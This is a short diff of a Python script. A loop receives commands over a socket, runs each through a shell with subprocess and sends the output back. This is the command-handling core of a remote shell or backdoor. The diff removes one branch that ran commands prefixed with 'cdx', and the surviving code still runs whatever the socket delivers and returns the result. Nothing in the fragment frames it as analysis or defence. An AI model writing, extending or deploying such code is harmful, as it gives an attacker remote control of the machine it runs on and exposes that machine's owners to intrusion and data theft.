@@ -29,12 +29,6 @@ while data_received < data_expected:
       proc = subprocess.Popen('cd ..', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
       output = proc.stdout.read() + proc.stderr.read()
       sock.send(output + b' \n')
-     if 'cdx' in data.decode('utf-8'):
-      bx = data.decode('utf-8')
-      a = bx.split('cdx')[1]
-      proc = subprocess.Popen(a, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-      output = proc.stdout.read() + proc.stderr.read()
-      sock.send(output + b' \n')
 
     else:
       proc = subprocess.Popen(data.decode(), shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
